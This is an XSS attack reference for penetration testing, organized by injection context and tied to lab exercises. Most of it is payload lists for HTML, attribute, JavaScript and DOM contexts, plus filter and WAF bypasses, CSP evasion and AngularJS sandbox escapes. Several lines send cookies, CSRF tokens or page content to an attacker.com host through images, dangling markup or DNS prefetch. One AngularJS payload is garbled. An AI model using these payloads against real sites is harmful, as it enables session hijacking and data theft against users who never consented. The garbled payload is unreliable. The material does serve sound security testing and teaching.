---
id: PS-XSS
category: Cross-site scripting
wstg_refs: [WSTG-INPV-01, WSTG-INPV-02, WSTG-CLNT-01]
lab_count: 30
dom_lab_count: 7
---

# Cross-Site Scripting (XSS): Attack Technique Reference

This guide covers detection, context-specific exploitation, filter/WAF bypass, CSP evasion, DOM-based techniques, and a comprehensive payload library. Organized by injection context and bypass method for use during real penetration testing engagements.

---

## 1. Detection

### 1A. Reflection/Storage Discovery

**Step 1: Inject canary strings into every input vector.**

Use a unique alphanumeric canary that will not appear naturally in the application:

```
CANARY7x8k9m2q
```

Inject into: URL parameters, form fields, HTTP headers (Referer, User-Agent, X-Forwarded-For), JSON body properties, cookie values, file upload filenames, WebSocket messages, and postMessage data.

**Step 2: Search all response locations for the canary.**

Check: HTML body, HTML attributes, JavaScript blocks, JSON responses, HTTP headers, error messages, and admin/log views (for stored XSS). Use `grep -c CANARY7x8k9m2q` on the full response. For DOM-based detection, search the live DOM via browser DevTools (Ctrl+F / Cmd+F), not the raw HTML source.

**Step 3: Test each reflection point individually.**

For every location where the canary appears, identify the exact context (see 1B below) and select context-appropriate payloads. A single input may reflect in multiple contexts across the same or different pages.

**Step 4: Check for stored reflections.**

After injecting canaries, browse to other pages, admin panels, profile views, comment listings, and log viewers. Stored XSS may appear on a different page or after a delay. Check both authenticated and unauthenticated views.

**Automated discovery with dalfox:**
```bash
rynix_plugin_run('wstg') dalfox url "https://target.com/search?q=test" --silence --output /tmp/dalfox-results.txt
```

### 1B. Context Identification

After finding where input reflects, determine the rendering context by inspecting the surrounding HTML/JS. The context dictates which payloads will succeed.

| Context | What You See in Source | Section |
|---------|----------------------|---------|
| HTML body | `<div>CANARY</div>`, `<p>CANARY</p>` | 2A |
| HTML attribute (unquoted) | `<input value=CANARY>` | 2B |
| HTML attribute (single-quoted) | `<input value='CANARY'>` | 2B |
| HTML attribute (double-quoted) | `<input value="CANARY">` | 2B |
| `href`/`src` attribute | `<a href="CANARY">`, `<iframe src="CANARY">` | 2B |
| Event handler attribute | `<div onclick="doSomething('CANARY')">` | 2B/2C |
| JavaScript string (single-quoted) | `var x = 'CANARY';` | 2C |
| JavaScript string (double-quoted) | `var x = "CANARY";` | 2C |
| JavaScript template literal | `` var x = `CANARY`; `` | 2C |
| Inside `<script>` block | `<script>var data = "CANARY";</script>` | 2C |
| JSON response | `{"result": "CANARY"}` | 2C |
| CSS value | `style="color: CANARY"` | 2B |
| URL parameter | `<a href="/page?redirect=CANARY">` | 2B |
| DOM sink (no server reflection) | Input consumed by JS only (innerHTML, document.write, eval) | 2D |
| AngularJS template | `<div ng-app>{{CANARY}}</div>` | 3E |

**Key check:** Determine which characters are encoded, escaped, or stripped. Inject `<>"'/\`` and observe what survives. This determines whether you need breakout payloads or can inject directly.

---

## 2. Context-Specific Exploitation

### 2A. XSS in HTML Body

**When input lands between HTML tags** (e.g., `<div>USER_INPUT</div>`), you can introduce new HTML elements that execute JavaScript.

**Basic payloads (no filtering):**
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<marquee onstart=alert(1)>
<meter onmouseover=alert(1)>
<textarea autofocus onfocus=alert(1)>
```

**When `<script>` is blocked:**
Use alternative tags with event handlers that fire automatically (no user interaction required):
```html
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
<object data="javascript:alert(1)">
<embed src="javascript:alert(1)">
```

**When both `<script>` and common tags are blocked:**
See section 3A for tag restriction bypasses (custom tags, SVG, MathML, etc.).

> Lab refs: PS-XSS-01 (reflected, HTML body, nothing encoded), PS-XSS-02 (stored, HTML body, nothing encoded), PS-XSS-14 (most tags and attributes blocked), PS-XSS-15 (all standard tags blocked, custom tags allowed)

### 2B. XSS in HTML Attributes

**When input lands inside an HTML attribute value**, the approach depends on the quoting style and which characters survive encoding.

#### Breaking out of quoted attributes

If angle brackets `<>` are not encoded, terminate the attribute and tag, then inject a new element:
```html
"><script>alert(1)</script>
'><script>alert(1)</script>
"><img src=x onerror=alert(1)>
```

#### Event handler injection (when `<>` are encoded)

If angle brackets are HTML-encoded but quotes are not, inject a new attribute with an event handler:
```html
" autofocus onfocus=alert(1) x="
" onmouseover=alert(1) x="
' autofocus onfocus=alert(1) x='
" onfocus=alert(1) autofocus="
```

The `autofocus` attribute with `onfocus` fires automatically without user interaction. If `autofocus` is blocked, `onmouseover` requires mouse movement over the element.

#### javascript: protocol in href/src attributes

When input is placed directly into an `href`, `src`, `action`, or `formaction` attribute:
```html
javascript:alert(1)
javascript:alert(document.domain)
javascript:void(0);alert(1)
```

Works in: `<a href>`, `<area href>`, `<form action>`, `<button formaction>`, `<iframe src>`, `<object data>`, `<embed src>`, `<base href>`.

#### XSS in canonical link tags

When input reflects into a `<link rel="canonical" href="...">` tag, use `accesskey` to create a keyboard-triggered event:
```html
" accesskey="x" onclick="alert(1)" x="
```
The victim must press the access key combination (Alt+Shift+X on Windows, Ctrl+Alt+X on Mac) for this to fire.

#### XSS inside event handler attributes

When input is inside an existing event handler like `onclick="track('USERINPUT')"`, the value is first HTML-decoded by the browser before JavaScript execution. Use HTML entities to break out:
```
&apos;-alert(1)-&apos;
&apos;);alert(1);//
```
The browser decodes `&apos;` to `'` before executing the JavaScript in the event handler.

> Lab refs: PS-XSS-07 (attribute context, angle brackets encoded), PS-XSS-08 (stored in href, double quotes encoded), PS-XSS-17 (canonical link tag), PS-XSS-20 (onclick event, angles+quotes encoded, single quotes escaped), PS-XSS-27 (event handlers and href blocked)

### 2C. XSS in JavaScript Context

**When input lands inside a JavaScript string, expression, or block**, the goal is to break out of the current JS context and execute arbitrary code.

#### Terminating the enclosing `<script>` tag

If the server does not escape `</script>`, you can close the script block and inject HTML regardless of JavaScript string escaping:
```html
</script><img src=x onerror=alert(1)>
</script><script>alert(1)</script>
```
Browsers prioritize HTML parsing over JavaScript parsing, so `</script>` always closes the block even if it appears inside a JS string literal.

#### Breaking out of JavaScript string literals

**Single-quoted string:**
```javascript
'-alert(1)-'
';alert(1)//
';alert(1);'
```

**Double-quoted string:**
```javascript
"-alert(1)-"
";alert(1)//
";alert(1);"
```

The `-` operator works because JavaScript evaluates `alert(1)` as part of the arithmetic expression. The `;` terminates the current statement and starts a new one. `//` comments out the rest of the line.

#### Bypassing backslash escaping

When the application escapes quotes by adding backslashes (`'` becomes `\'`), but does not escape the backslash character itself, inject your own backslash to neutralize the added one:
```
\';alert(1)//
```
The application transforms this to `\\';alert(1)//` where `\\` is an escaped backslash literal, leaving the `'` unescaped to break the string.

#### When quotes AND backslashes are escaped

If both `'` and `\` are escaped, try terminating the `<script>` tag instead (see above). Alternatively, if angle brackets are also encoded, use HTML entity encoding inside event handler attributes (see 2B).

Another approach when single quotes are escaped but the string is in an event handler context:
```
&apos;-alert(1)-&apos;
```
HTML entities are decoded before JavaScript execution in event handler attributes.

#### Template literal injection

When input lands inside a JavaScript template literal (backtick-delimited string), use `${}` expression interpolation:
```javascript
${alert(1)}
${alert(document.domain)}
${7*7}
```
No need to break out of the string -- the expression inside `${}` executes directly.

#### Calling functions without parentheses

When parentheses `()` are filtered, use the `throw` statement with `onerror`:
```javascript
onerror=alert;throw 1
```
Or use tagged template literals:
```javascript
alert`1`
```
Or use constructor patterns:
```javascript
[].constructor.constructor('alert(1)')()
```

> Lab refs: PS-XSS-09 (JS string, angle brackets encoded), PS-XSS-18 (JS string, single quote + backslash escaped), PS-XSS-19 (JS string, angles + double quotes encoded + single quotes escaped), PS-XSS-21 (template literal, extensive escaping), PS-XSS-28 (JavaScript URL with chars blocked)

### 2D. DOM-Based XSS

DOM XSS occurs entirely client-side when JavaScript reads from an attacker-controllable **source** and writes to a dangerous **sink** without sanitization. No server-side reflection is required.

#### Common Sources (attacker-controllable input)

| Source | Notes |
|--------|-------|
| `location.search` | URL query string (`?param=value`). URL-encoded by Chrome/Firefox/Safari. |
| `location.hash` | URL fragment (`#value`). URL-encoded by modern browsers. |
| `location.href` | Full URL including path, query, and hash. |
| `location.pathname` | URL path segment. |
| `document.URL` | Full document URL (same as `location.href` in most cases). |
| `document.referrer` | The referring page URL. |
| `document.cookie` | Cookie values (if attacker can set cookies via other vulns). |
| `window.name` | Persists across navigations. Attacker sets it on their page, then navigates victim. |
| `window.postMessage` | Cross-origin messaging. Attacker sends messages from their page via iframe. |
| `Web Storage` | `localStorage` / `sessionStorage` (if attacker can write via other vulns). |

**Browser encoding note:** Modern browsers (Chrome, Firefox, Safari) URL-encode `location.search` and `location.hash`, which can prevent some DOM XSS payloads. However, `document.URL` and `location.href` may return decoded values in some contexts, and `window.name` / `postMessage` are never encoded.

#### Common Sinks (dangerous output functions)

**HTML injection sinks** (accept HTML, parse tags):
| Sink | Accepts `<script>`? | Preferred Payload |
|------|---------------------|-------------------|
| `document.write()` | Yes | `<script>alert(1)</script>` or `<img src=x onerror=alert(1)>` |
| `document.writeln()` | Yes | Same as `document.write()` |
| `element.innerHTML` | No | `<img src=x onerror=alert(1)>` or `<svg onload=alert(1)>` |
| `element.outerHTML` | No | Same as `innerHTML` |
| `element.insertAdjacentHTML()` | No | Same as `innerHTML` |

**JavaScript execution sinks** (execute code directly):
| Sink | Payload |
|------|---------|
| `eval()` | `alert(1)` or `';alert(1)//` (if inside string) |
| `setTimeout(string)` | Same as `eval()` |
| `setInterval(string)` | Same as `eval()` |
| `new Function(string)` | `alert(1)` |
| `execScript()` | `alert(1)` (IE only) |

**URL/navigation sinks:**
| Sink | Payload |
|------|---------|
| `location.href = x` | `javascript:alert(1)` |
| `location.assign(x)` | `javascript:alert(1)` |
| `location.replace(x)` | `javascript:alert(1)` |
| `window.open(x)` | `javascript:alert(1)` |
| `element.href = x` | `javascript:alert(1)` (for `<a>` tags) |
| `element.src = x` | `javascript:alert(1)` (for `<iframe>`) |
| `element.action = x` | `javascript:alert(1)` (for `<form>`) |

**jQuery-specific sinks:**
| Sink | Payload | Notes |
|------|---------|-------|
| `$(selector)` / `jQuery(selector)` | `<img src=x onerror=alert(1)>` | When selector contains attacker input, jQuery creates elements |
| `.html(x)` | `<img src=x onerror=alert(1)>` | Sets innerHTML on matched elements |
| `.append(x)` | `<img src=x onerror=alert(1)>` | Appends HTML content |
| `.prepend(x)` | Same as `.append()` | Prepends HTML content |
| `.after(x)` / `.before(x)` | Same as `.append()` | Inserts HTML adjacent to element |
| `.replaceWith(x)` | Same as `.append()` | Replaces element with HTML |
| `.wrap(x)` / `.wrapAll(x)` / `.wrapInner(x)` | Same as `.append()` | Wraps elements with HTML |
| `.attr('href', x)` | `javascript:alert(1)` | When setting href on anchor elements |
| `$.parseHTML(x)` | `<img src=x onerror=alert(1)>` | Parses HTML string into DOM nodes |
| `$().add(x)` | `<img src=x onerror=alert(1)>` | Creates elements from HTML string |
| `$().index(x)` | `<img src=x onerror=alert(1)>` | If x is a selector string |
| `$().has(x)` | `<img src=x onerror=alert(1)>` | If x is a selector string |
| `$().constructor(x)` | `<img src=x onerror=alert(1)>` | Alias for `$()` |

#### Source-to-Sink Tracing Methodology

1. **Search JavaScript files** for source references (Ctrl+Shift+F in DevTools): search for `location.search`, `location.hash`, `document.URL`, `document.referrer`, `window.name`, `postMessage`, `addEventListener("message"`.
2. **Set breakpoints** on source reads and trace the variable through assignments, function calls, and transformations.
3. **Identify the sink** where the tainted data is written. If the data passes through encoding or sanitization functions, determine whether they are bypassable.
4. **Test with a canary** before attempting exploitation payloads. Inject through the source and verify it reaches the sink unmodified.
5. **Use browser DevTools DOM breakpoints**: right-click an element, "Break on" > "Subtree modifications" to catch `innerHTML` writes.

#### Reflected DOM XSS

The server echoes URL parameters into a JavaScript context in the response. The client-side script then processes the reflected data through a sink:
```javascript
// Server reflects search term into script block:
eval('var data = "reflected_search_term"');
```
Attack: inject `\"-alert(1)}//` to break out of the `eval()` string.

#### Stored DOM XSS

The server stores user input and includes it in later responses. Client-side JavaScript then processes the stored data through a sink:
```javascript
// Server includes stored comment in response, JS inserts it:
element.innerHTML = storedCommentFromServer;
```
Attack: inject `<img src=x onerror=alert(1)>` as a comment, which renders when any user views the page.

#### jQuery `$()` with `location.hash`

Classic pattern: jQuery selects an element using `location.hash`:
```javascript
$(window).on('hashchange', function() {
    var element = $(location.hash);
    element[0].scrollIntoView();
});
```
Modern jQuery (3.x+) patches this when input starts with `#`, but older versions allow HTML injection. Exploit via an iframe that manipulates the hash:
```html
<iframe src="https://target.com#" onload="this.src+='<img src=x onerror=alert(1)>'">
```

> Lab refs: PS-XSS-03 (document.write + location.search), PS-XSS-04 (innerHTML + location.search), PS-XSS-05 (jQuery attr href + location.search), PS-XSS-06 (jQuery selector + hashchange), PS-XSS-10 (document.write inside select element), PS-XSS-11 (AngularJS expression), PS-XSS-12 (reflected DOM XSS), PS-XSS-13 (stored DOM XSS), PS-DOM-01 (web messages), PS-DOM-02 (web messages + javascript URL), PS-DOM-03 (web messages + JSON.parse), PS-DOM-06 (DOM clobbering to enable XSS), PS-DOM-07 (clobbering DOM attributes to bypass HTML filters)

### 2E. Stored XSS

Stored (persistent) XSS executes every time the tainted data is rendered, affecting all users who view the affected page. It does not require the victim to click a crafted link.

#### Common injection points for stored XSS

| Vector | Where It Renders | Priority |
|--------|-----------------|----------|
| Comment/review body | Article pages, product pages | HIGH |
| Display name / username | Profile pages, comment headers, admin user lists | HIGH |
| Profile fields (bio, website, location) | Public profile views, search results | MEDIUM |
| Email subject/body | Webmail interfaces, notification views | MEDIUM |
| File upload filenames | File listing pages, download links | MEDIUM |
| Form labels / custom field names | Admin configuration pages | LOW |
| Chat/message content | Messaging interfaces, support dashboards | HIGH |
| Forum post titles | Forum index pages, search results | HIGH |
| Feedback/contact form content | Admin dashboard, support ticket views | HIGH |

#### Stored XSS testing procedure

1. Inject context-appropriate payloads into every persistent input field.
2. Navigate to all pages where the stored data is displayed.
3. Check each rendering context separately -- the same data may render safely on one page but execute on another.
4. Check both the injecting user's view and other users' views (stored XSS may only render for other users, e.g., admin reviewing user submissions).
5. Test with time delays -- some stored data processes asynchronously (email notifications, scheduled reports, log aggregation).

#### Second-order stored XSS

Input is stored in one location and rendered unsafely in a completely different feature:
- Username stored during registration, rendered in admin user management panel
- Email subject stored by mail server, rendered in webmail client
- Log entry stored by application, rendered in log viewer dashboard
- File metadata stored during upload, rendered in file browser

> Lab refs: PS-XSS-02 (stored in HTML body), PS-XSS-08 (stored in href attribute), PS-XSS-13 (stored DOM XSS), PS-XSS-20 (stored in onclick event handler)

---

## 3. Filter/WAF Bypass Techniques

### 3A. Tag Restrictions

When the application or WAF blocks specific HTML tags, use alternative elements that support event handlers.

#### Custom/uncommon tags that bypass blocklists

```html
<xss autofocus onfocus=alert(1)>
<custom autofocus onfocus=alert(1)>
<xss id=x tabindex=1 onfocus=alert(1)>
```
Custom tags (any tag name not in the HTML spec) are valid HTML and support global event handlers like `onfocus`, `onblur`, `onmouseover`. Combined with `autofocus` or `tabindex`, they fire automatically.

#### SVG namespace tags

```html
<svg><animatetransform onbegin=alert(1)>
<svg/onload=alert(1)>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<svg><set onbegin=alert(1) attributeName=x to=1>
```
SVG elements support unique events like `onbegin`, `onend`, `onrepeat` on animation elements. These fire automatically when the SVG renders.

#### MathML tags

```html
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>
```

#### HTML5 interactive elements

```html
<details open ontoggle=alert(1)>
<details open ontoggle=alert(1)><summary>X</summary>
<dialog open onclose=alert(1)>
<menu><menuitem onclick=alert(1)>
```

#### Tags that commonly bypass WAFs

| Tag | Event | User Interaction? |
|-----|-------|-------------------|
| `<img>` | `onerror` | No (fires on load failure) |
| `<svg>` | `onload` | No (fires when SVG renders) |
| `<body>` | `onload` | No (fires on page load) |
| `<input>` | `onfocus` + `autofocus` | No |
| `<textarea>` | `onfocus` + `autofocus` | No |
| `<select>` | `onfocus` + `autofocus` | No |
| `<details>` | `ontoggle` + `open` | No |
| `<video>` | `onloadstart` + `autoplay` | No (with `<source src=x>`) |
| `<audio>` | `onloadstart` + `autoplay` | No (with `<source src=x>`) |
| `<marquee>` | `onstart` | No (fires when scrolling starts) |
| `<meter>` | `onmouseover` | Yes (mouse hover) |
| `<iframe>` | `onload` | No (fires when frame loads) |
| `<embed>` | N/A | Use `src=javascript:alert(1)` |
| `<object>` | N/A | Use `data=javascript:alert(1)` |
| `<xss>` (custom) | `onfocus` + `autofocus` | No |
| `<animate>` (SVG) | `onbegin` | No |
| `<set>` (SVG) | `onbegin` | No |

**Fuzzing strategy:** When the WAF blocks tags, use fuzz-cli or a custom script to test which tags are allowed:
```bash
# Test which tags pass the WAF
rynix_plugin_run('wstg') fuzz-cli -u "https://target.com/search?q=<FUZZ>" -w /app/wordlists/xss-tags.txt -mc all -mr "FUZZ"
```

> Lab refs: PS-XSS-14 (most tags/attributes blocked -- use body+onresize via iframe), PS-XSS-15 (all standard tags blocked -- use custom tags), PS-XSS-16 (some SVG markup allowed), PS-XSS-27 (event handlers and href blocked -- use animate tag)

### 3B. Event Handler Restrictions

When common event handlers like `onload`, `onerror`, `onclick` are blocked, use less common events that fire automatically.

#### Auto-firing events (no user interaction)

**Animation/Transition events** (require CSS animation definition):
```html
<style>@keyframes x{from{left:0}to{left:100px}}</style>
<xss style="animation-name:x" onanimationstart=alert(1)>
<xss style="animation-name:x" onanimationend=alert(1)>
<xss style="animation-name:x" onanimationiteration=alert(1)>
<xss style="transition:all 0.1s" ontransitionend=alert(1)>
<xss style="animation-name:x" onwebkitanimationend=alert(1)>
<xss style="transition:all 0.1s" onwebkittransitionend=alert(1)>
```

**SVG animation events:**
```html
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<svg><animate onend=alert(1) attributeName=x dur=1s>
<svg><animate onrepeat=alert(1) attributeName=x dur=1s repeatCount=2>
<svg><set onbegin=alert(1) attributeName=x to=1>
```

**Focus events (with autofocus):**
```html
<input autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<xss tabindex=1 autofocus onfocus=alert(1)>
<xss autofocus onfocusin=alert(1)>
```

**Media events (with autoplay or invalid source):**
```html
<video autoplay onloadstart=alert(1)><source src=x>
<audio autoplay onloadstart=alert(1)><source src=x>
<video autoplay onplay=alert(1)><source src=validvideo.mp4>
<video autoplay onplaying=alert(1)><source src=validvideo.mp4>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<video><source onerror=alert(1)>
<img src=x onerror=alert(1)>
<image src=x onerror=alert(1)>
<input type=image src=x onerror=alert(1)>
```

**Page/window events:**
```html
<body onload=alert(1)>
<body onpageshow=alert(1)>
<body onresize=alert(1)>    (trigger via iframe: <iframe onload=this.style.width='0'>)
<body onscroll=alert(1)>     (requires scrollable content)
<body onhashchange=alert(1)> (trigger via iframe hash manipulation)
<body onpopstate=alert(1)>   (trigger via history.pushState)
<body onmessage=alert(1)>    (trigger via postMessage from attacker page)
```

**Toggle/visibility events:**
```html
<details open ontoggle=alert(1)>
<div popover ontoggle=alert(1)>
<xss style="content-visibility:auto" oncontentvisibilityautostatechange=alert(1)>
```

**Shadow DOM/Slot events:**
```html
<div><template shadowrootmode=open><slot onslotchange=alert(1)></slot></template><xss>
```

**Security policy violation:**
```html
<xss onsecuritypolicyviolation=alert(1)>
<!-- then trigger a CSP violation -->
```

**Print events:**
```html
<body onbeforeprint=alert(1)>
<!-- trigger via window.print() or Ctrl+P -->
```

#### Complete event handler reference (no user interaction)

| Event Handler | Trigger Mechanism |
|--------------|-------------------|
| `onload` | Element finishes loading (img, body, iframe, script, style, link) |
| `onerror` | Resource fails to load (img src=x, video src=x, audio src=x, script src=x) |
| `onfocus` | Element receives focus (combine with `autofocus` attribute) |
| `onfocusin` | Same as onfocus but bubbles up the DOM tree |
| `onblur` | Element loses focus (combine with `autofocus` on a second element) |
| `onanimationstart` | CSS animation begins (requires `@keyframes` + `animation-name`) |
| `onanimationend` | CSS animation completes |
| `onanimationiteration` | CSS animation repeats a cycle |
| `ontransitionend` | CSS transition completes |
| `ontransitionrun` | CSS transition starts running |
| `ontransitionstart` | CSS transition starts |
| `onbegin` | SVG animation begins (SVG `<animate>`, `<set>` elements) |
| `onend` | SVG animation ends |
| `onrepeat` | SVG animation repeats |
| `ontoggle` | `<details>` toggled (combine with `open` attribute) or popover shown |
| `onresize` | Window/element resized (trigger from iframe) |
| `onscroll` | Element scrolled |
| `onscrollend` | Scroll operation completes |
| `onhashchange` | URL hash changes (trigger from iframe) |
| `onpopstate` | Browser history navigated |
| `onmessage` | Window receives postMessage |
| `onpageshow` | Page is shown (includes back/forward cache) |
| `onloadstart` | Media loading begins (video/audio with autoplay) |
| `onplay` | Media playback starts |
| `onplaying` | Media playback is ongoing |
| `oncanplay` | Media can start playing |
| `onloadeddata` | Media first frame loaded |
| `onloadedmetadata` | Media metadata loaded |
| `ondurationchange` | Media duration changes |
| `onprogress` | Media download in progress |
| `onsuspend` | Media loading suspended |
| `ontimeupdate` | Media playback position changes |
| `onstart` | `<marquee>` starts scrolling |
| `oncontentvisibilityautostatechange` | `content-visibility: auto` element becomes visible |
| `onslotchange` | Shadow DOM slot content changes |
| `onsecuritypolicyviolation` | CSP violation occurs |
| `onbeforeprint` | Print dialog about to open |
| `onwaiting` | Media playback waiting (with `loop` attribute) |

### 3C. Encoding Bypasses

When the application encodes or filters specific characters, use alternative representations.

#### HTML entity encoding (in attribute contexts)

Inside event handler attributes, the browser HTML-decodes the attribute value before executing JavaScript:
```html
<a href="javascript:alert(1)">       <!-- direct -->
<a href="javascript&#58;alert(1)">   <!-- HTML decimal entity for : -->
<a href="javascript&#x3a;alert(1)">  <!-- HTML hex entity for : -->
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">  <!-- full entity encoding -->
```

Inside onclick/onmouseover/etc. attributes:
```html
<div onclick="alert(1)">          <!-- direct -->
<div onclick="&#97;lert(1)">      <!-- partial entity encoding -->
<div onclick="al\u0065rt(1)">     <!-- JavaScript Unicode escape inside event handler -->
```

#### URL encoding (in URL contexts)

```
javascript:alert(1)
javascript:%61lert(1)          <!-- URL-encoded 'a' -->
java%0ascript:alert(1)         <!-- newline between java and script -->
java%09script:alert(1)         <!-- tab between java and script -->
java%0dscript:alert(1)         <!-- carriage return -->
```

#### JavaScript Unicode escapes

Inside `<script>` blocks, JavaScript Unicode escapes work in identifiers:
```javascript
\u0061lert(1)                    // alert(1)
\u0061\u006c\u0065\u0072\u0074(1) // alert(1)
window['al\u0065rt'](1)          // window.alert(1)
```

#### Double encoding

If the application decodes input twice (e.g., URL decode then HTML decode):
```
%253Cscript%253Ealert(1)%253C/script%253E    <!-- double URL encoding -->
%26lt;script%26gt;                             <!-- URL-encoded HTML entities -->
```

#### Case variation and null bytes

```html
<ScRiPt>alert(1)</ScRiPt>         <!-- mixed case -->
<scr%00ipt>alert(1)</script>       <!-- null byte insertion (legacy browsers) -->
<scri\x00pt>alert(1)</script>      <!-- null byte variant -->
```

#### Whitespace and comment tricks

```html
<img/src=x/onerror=alert(1)>      <!-- forward slash as attribute separator -->
<img%0asrc=x%0aonerror=alert(1)>   <!-- newline as separator -->
<img%09src=x%09onerror=alert(1)>   <!-- tab as separator -->
<img%0dsrc=x%0donerror=alert(1)>   <!-- carriage return as separator -->
<!--><img src=x onerror=alert(1)>  <!-- HTML comment trick -->
<svg/onload=alert(1)>              <!-- no space needed after tag name -->
```

> Lab refs: PS-XSS-19 (angle brackets + double quotes HTML-encoded, single quotes escaped -- use backslash escape), PS-XSS-20 (onclick event -- use HTML entity encoding)

### 3D. CSP Bypass Techniques

Content Security Policy restricts which scripts can execute. When XSS injection is possible but CSP blocks execution, these bypass techniques apply.

#### Identifying CSP configuration

```bash
http_probe -sk -D- https://target.com/ | grep -i content-security-policy
```

Key directives to analyze:
- `script-src`: What script sources are allowed?
- `default-src`: Fallback for unspecified directives
- `base-uri`: Can `<base>` be injected to redirect relative script URLs?
- `report-uri` / `report-to`: May reveal the policy structure

#### Bypass via JSONP endpoints on whitelisted domains

If `script-src` includes a domain that has JSONP endpoints (e.g., Google APIs, CDNs, analytics services):
```html
<script src="https://whitelisted-cdn.com/jsonp?callback=alert(1)//"></script>
```

Common JSONP endpoints on popular CDNs and services:
```
accounts.google.com/o/oauth2/revoke?callback=alert(1)
www.google.com/complete/search?client=chrome&q=test&callback=alert(1)
```

#### Bypass via AngularJS on whitelisted CDN

If `script-src` allows a CDN that hosts AngularJS (e.g., `cdnjs.cloudflare.com`, `ajax.googleapis.com`):
```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.min.js"></script>
<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>
```

AngularJS with `ng-csp` directive processes template expressions without using `eval()`, bypassing both `script-src` and `unsafe-eval` restrictions.

#### Bypass via `base-uri` injection

If `base-uri` is not set in the CSP (or set to `'self'`), and the page loads scripts via relative paths:
```html
<base href="https://attacker.com/">
```
All relative script sources (`<script src="/js/app.js">`) now load from `attacker.com` instead.

#### CSP policy injection

If user input reflects into the CSP header itself (e.g., via `report-uri` parameter):
```
Content-Security-Policy: ...; report-uri /csp-report?token=USER_INPUT
```
Inject a semicolon to add a new directive that overrides existing restrictions:
```
USER_INPUT = x; script-src-elem 'unsafe-inline'
```
Chrome's `script-src-elem` overrides `script-src`, enabling inline script execution.

#### Dangling markup attack (strict CSP)

When CSP is very strict (nonce-based or hash-based `script-src`), you cannot inject executable scripts directly. Instead, use dangling markup to exfiltrate sensitive data:
```html
<a href="https://attacker.com/steal?data="><img src='https://attacker.com/log?
```
The unclosed attribute captures everything after the injection point until the next matching quote. When the user clicks the link (or the page auto-submits), sensitive data like CSRF tokens are sent to the attacker.

For img-based exfiltration when CSP allows images:
```html
<img src="https://attacker.com/log?data=
```
The unclosed attribute captures subsequent HTML until the next `"`, and the browser makes a request to the attacker's server with the captured data as a URL parameter.

#### Bypass via `'unsafe-eval'`

If `script-src` includes `'unsafe-eval'`:
```html
<script>eval('alert(1)')</script>
<script>setTimeout('alert(1)',0)</script>
<script>setInterval('alert(1)',0)</script>
<script>new Function('alert(1)')()</script>
```

#### Bypass via `'unsafe-inline'`

If `script-src` includes `'unsafe-inline'` (common misconfiguration):
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
```
Standard XSS payloads work without restriction.

#### Bypass via `data:` URI scheme

If `script-src` includes `data:`:
```html
<script src="data:text/javascript,alert(1)"></script>
```

#### Exfiltration when `connect-src` is restricted

If `connect-src` blocks fetch/XHR but `img-src` is permissive:
```javascript
new Image().src = 'https://attacker.com/log?' + document.cookie;
```
If `img-src` is also restricted, try `dns-prefetch`:
```html
<link rel="dns-prefetch" href="//COOKIE_VALUE.attacker.com">
```

> Lab refs: PS-XSS-26 (AngularJS sandbox escape + CSP bypass), PS-XSS-29 (strict CSP + dangling markup), PS-XSS-30 (CSP bypass via policy injection)

### 3E. AngularJS Sandbox Escapes

When the application uses AngularJS (1.x) and the `ng-app` directive is present, template expressions inside `{{ }}` are evaluated. AngularJS versions before 1.6 included a sandbox that restricts access to dangerous objects. These escapes bypass the sandbox.

#### Detecting AngularJS template injection

Inject `{{7*7}}` -- if the page renders `49`, AngularJS is processing template expressions.

Check the AngularJS version:
```javascript
angular.version.full
```
Or look for version strings in the AngularJS script file loaded by the page.

#### Sandbox escape payloads (AngularJS < 1.6)

**Standard sandbox escape (with strings):**
```
{{$eval.constructor('alert(1)')()}}
{{constructor.constructor('alert(1)')()}}
{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)')}}
```

The `charAt` override technique replaces `String.prototype.charAt` with `Array.prototype.join`, causing AngularJS's `isIdent()` check to see all characters at once instead of individually, bypassing the identifier validation.

**Sandbox escape without strings (when quotes are blocked):**
```
{{$eval.constructor(String.fromCharCode(97,108,101,114,116,40,49,41))()}}
```
`String.fromCharCode` constructs the string `alert(1)` without using any quote characters.

**With `toString()` and `orderBy`:**
```
{{[123]|orderBy:'Some string'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
```
The `orderBy` filter is an alternative execution path when `$eval` is not directly available.

#### AngularJS + CSP bypass

When both AngularJS sandbox and CSP are in play, use the `$event` object:
```
<input autofocus ng-focus="$event.path|orderBy:'[].constructor.from([1],alert)'">
<input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'">
```

The `$event.path` (or `$event.composedPath()`) provides a reference to the `window` object without explicitly naming it, bypassing both the AngularJS sandbox window detection and CSP's `unsafe-eval` restriction.

Alternative using `array.map()`:
```
<input autofocus ng-focus="x]|orderBy:'[].constructor.from([1],a]lert)'">
```

#### AngularJS 1.6+ (no sandbox)

AngularJS 1.6 removed the sandbox entirely. Template injection directly executes:
```
{{constructor.constructor('alert(1)')()}}
{{$eval.constructor('alert(1)')()}}
```

> Lab refs: PS-XSS-11 (AngularJS expression, angles + quotes encoded), PS-XSS-25 (AngularJS sandbox escape without strings), PS-XSS-26 (AngularJS sandbox escape + CSP)

### 3F. Additional Bypass Techniques

#### Mutation XSS (mXSS)

When HTML sanitizers (DOMPurify, server-side sanitizers) parse HTML differently than the browser:
```html
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>
<svg><style>{font-family:<img/src=x onerror=alert(1)>}
<form><math><mtext><form><mglyph><svg><mtext><textarea><path id="</textarea><img/src=x onerror=alert(1)>">
```
